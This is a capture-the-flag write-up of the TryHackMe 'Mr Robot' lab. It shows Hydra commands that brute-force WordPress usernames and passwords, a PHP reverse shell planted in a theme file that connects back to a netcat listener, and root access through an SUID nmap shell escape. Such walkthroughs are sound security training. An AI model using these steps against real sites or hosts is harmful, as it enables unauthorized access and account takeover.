---
title: "THM:mrrobot"
subtitle: "TryHackMe CTF room: https://tryhackme.com/room/mrrobot"
category: "CTF"
tags: ctf,nmap,gobuster,apache,ubuntu,john,hydra,privesc
---
# THM:mrrobot

URL: [https://tryhackme.com/room/mrrobot](https://tryhackme.com/room/mrrobot) [Medium]

Tags: 
<div style="margin-left: 5px;">
{% assign tags = page.tags | split: "," %}
{% for tag in tags %}
<a href="../search/?q={{tag}}" title="Click to search by this tag"><span class="badge bg-secondary">{{tag}}</span></a>
{% endfor %}
</div>
<hr>

## Reconnaissance

Description of the room:

> Based on the Mr. Robot show, can you root this box?

## Scanning

### Running: `nmap`

Ran the following:

> `nmap -sCV x.x.x.x`

Interesting ports found to be open:

```python
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-title: Site doesn't have a title (text/html).
```

Also see: [nmap.log](nmap.log)

### Running: `gobuster`

Ran the following:

> `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://x.x.x.x`

Interesting folders found:

```python
/blog                 (Status: 301) [Size: 233] [--> http://10.10.39.226/blog/]
/sitemap              (Status: 200) [Size: 0]
/login                (Status: 302) [Size: 0] [--> http://10.10.39.226/wp-login.php]
/wp-content           (Status: 301) [Size: 239] [--> http://10.10.39.226/wp-content/]
/admin                (Status: 301) [Size: 234] [--> http://10.10.39.226/admin/]
/wp-login             (Status: 200) [Size: 2606]
/robots               (Status: 200) [Size: 41]
/dashboard            (Status: 302) [Size: 0] [--> http://10.10.39.226/wp-admin/]
/wp-admin             (Status: 301) [Size: 237] [--> http://10.10.39.226/wp-admin/]
/phpmyadmin           (Status: 403) [Size: 94]```
```

Also see: [gobuster.log](gobuster.log)

### Running: `nikto`

Ran the following:

> `nikto -h x.x.x.x`

Interesting info found:

```python
+ Server: Apache
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /ODyr7ymu.pt: Retrieved x-powered-by header: PHP/5.5.29.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /index: Uncommon header 'tcn' found, with contents: list.
+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.html, index.php. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275
```

Also see: [nikto.log](nikto.log)

### Running: `hydra`

Two tips, here. I watched the walkthrough. In the comments, [someone mentioned a way](https://www.youtube.com/watch?v=BQ4xeeNAbaw&lc=Ugzghp1izjb5LPs9WQx4AaABAg) to make this processing a bit faster by re-organizing the contents of the wordlist file (which has ~1 million records). I ran:

```bash
# Gets all duplicate lines
sort ./fsocity.dic | uniq -d > new.txt

# Append all unique lines
sort ./fsocity.dic | uniq -u >> new.txt
```

This does get rid of a lot of noise. This merely concatenates the: unique lines plus the unique values where there were multiple entries. Makes a big difference in the number of lines in our wordlist. On my workstation, I was getting between 845 and 1,745 attempts per minute. So, doing the math, here's how long this might take:

| File          |     Size |   Lines | Est (@845/min) | Est (@1745/min) |
| ------------- | -------: | ------: | :------------: | :-------------: |
| `fsocity.dic` | 7,075 KB | 858,160 |     17 hrs     |      8 hrs      |
| `new.txt`     |    94 KB |  11,451 |    13 mins     |    6.5 mins     |


So, `new.txt` is the reorganized file I'll be working with. Next, I didn't really think of this. I was assuming based on the TV show, the username might be "elliot". However, since this Wordpress installation shows verbose messages, we can use `hydra` to test for possible usernames and for possible passwords.

You might remember for Hydra that:

<fieldset>
<legend>Hydra Arguments</legend>
<dl>
<dt><code>-L</code></dt>
<dd>Use a wordlist for the username (e.g. <code>hydra -L ./wordlist.txt ...</code>).</dd>
<dt><code>-l</code></dt>
<dd>Use a single, specific username (e.g. <code>hydra -l jdoe ...</code>).</dd>
<dt><code>-P</code></dt>
<dd>Use a wordlist for the password (e.g. <code>hydra -P ./wordlist.txt ...</code>).</dd>
<dt><code>-p</code></dt>
<dd>Use a single, specific password (e.g. <code>hydra -p password ...</code>)</dd>
</dl>
</fieldset>


#### Hydra for usernames
Keeping that in mind, we want to first use a **fixed password** and our **wordlist for potential usernames**:

```bash
hydra -L ./new.txt -p test \
    $TARGET http-post-form \
    "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username" -I 2>&1 | tee $ROOM/hydra-usernames.log
```

#### Hydra for passwords
From this effort, we see the username "Elliot" in various casing, so it's probably case-insenstive. Now, let's flip it around, use **"elliot" for a username** and the **wordlist for the password**:

```bash
hydra -l elliot -P ./new.txt \     
    $TARGET http-post-form \
    "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered" -I 2>&1 | tee $ROOM/hydra-passwords.log
```

It took about :15 minutes but we were able to get the password:

```bash
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-12 23:14:38
[DATA] max 30 tasks per 1 server, overall 30 tasks, 11452 login tries (l:1/p:11452), ~382 tries per task
[DATA] attacking http-post-form://10.10.83.180:80/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered
[STATUS] 1745.00 tries/min, 1745 tries in 00:01h, 9707 to do in 00:06h, 30 active
[STATUS] 1136.67 tries/min, 3410 tries in 00:03h, 8042 to do in 00:08h, 30 active
[STATUS] 845.00 tries/min, 5915 tries in 00:07h, 5537 to do in 00:07h, 30 active
[STATUS] 723.67 tries/min, 8684 tries in 00:12h, 2768 to do in 00:04h, 30 active
[80][http-post-form] host: 10.10.83.180   login: elliot   password: *********
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-08-12 23:31:30
```

Also see: [hydra-usernames.log](hydra-usernames.log) and [hydra-passwords.log](hydra-passwords.log).

## Gaining Access

We can now log into this Wordpress site as "elliot". One way to exploit this access is to navigate to the browser-based file editor for the "archive.php": `/wp-admin/theme-editor.php?file=archive.php` 

Since this is not a heavily used page, you could replace the contents with a [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell) remembering to change the IP and port to your workstation. Save your changes. For example, you run `netcat` to listen for the incoming connection on port `9000`:

```bash
# Listen for incoming connections...
nc -lvnp 9000
```

Lastly, navigate to: `/wp-content/themes/twentyfifteen/archive.php` to initiate the reverse shell back to your workstation. You should see something like this in the window that was running `netcat`:

```bash
listening on [any] 9000 ...
connect to [10.6.78.155] from (UNKNOWN) [10.10.83.180] 47920
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 03:39:26 up 27 min,  0 users,  load average: 0.00, 1.05, 2.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$
```

We can slightly upgrade our prompt with:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### Unprivileged Access

We now have a primitive prompt running as the `daemon` user. This user doesn't have any `sudo -l` privilege, doesn't have a home directory and can't do much.

We can look and see we have access to the `/home/robot` directory. Within there we have access to 1 of the 2 files:

```bash
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

If we grab the contents of that MD5 file which has `user:password` format and the username specified as `robot`, we can use a website like: [https://hashes.com/en/decrypt/hash](https://hashes.com/en/decrypt/hash) to see if it's a know message digest. It IS! That means we might have the password for the `robot` account. Let's see:

```bash
$ su robot
```

It prompts for the password, which we got from that MD5 de-hashing website, and now we're in as the `robot` account!

Can we run anything as `sudo`?

```bash
robot@linux:~$ sudo -l
sudo -l
[sudo] password for robot:

Sorry, user robot may not run sudo on linux.
```

Nope. However, can look back in the home directory and at least get the 2nd key (e.g. `/home/robot/key-2-of-3.txt`).

## Privilege Escalation

Keep in mind there is no SSH server running, so we're still stuck in this primitive prompt. Let's work on privilege escalation next and *very carefully* try not to break our prompt because we're: in a reverse shell, in a Python `pty.spawn`, then `su`'ed in as another user. Accidentally hitting <kbd>CTRL+C</kbd> can be pretty annoying!

We could run [Linpeas](https://github.com/carlospolop/PEASS-ng). Another place to start is to look for weirdly-configured (`setuid`) binaries:

```bash
find / -perm +6000 2> /dev/null | grep '/bin/'
```
<fieldset>
<legend>About setuid</legend>
<p>"setuid" (or "suid") binaries are special types of binary executable files in Unix-like operating systems that have a permission mode set which allows them to be executed with the privileges of the file owner, often granting higher privileges than the user running them would normally have. These binaries can perform actions that require elevated permissions, such as modifying system files or accessing sensitive data, even if the user executing them doesn"t have those privileges.</p>
<p>The permission mode "6000" is a combination of the "setuid" flag (bit 4000) and the regular executable flag (bit 100), resulting in a mode of "suid + execute" (also known as "setuid on execute"). When a binary file has this permission mode, it means that anyone who runs the binary will temporarily acquire the permissions of the owner of the binary.</p>
</fieldset>

And yes, there is one oddball in the output:

```bash
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/mail-touchlock
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/screen
/usr/bin/mail-unlock
/usr/bin/mail-lock
/usr/bin/chsh
/usr/bin/crontab
/usr/bin/chfn
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/expiry
/usr/bin/dotlockfile
/usr/bin/sudo
/usr/bin/ssh-agent
/usr/bin/wall
/usr/local/bin/nmap
```

It's `nmap`! Meaning, that when we run `nmap` on this target machine, we will take on the identity of the owner - who is `root`!

Using [gtfobins](https://gtfobins.github.io/gtfobins/nmap/) we can see that we can start `nmap --interactive` and then drop to a shell with `!sh` command from the `nmap> ` prompt.

Well, when we drop to a shell, we are now running as `root`!

We can now navigate and get the contents of `/root/key-3-of-3.txt`. We've gotten all of the keys and rooted the box.

## Summary

Completed: [2023-08-13 00:22:01]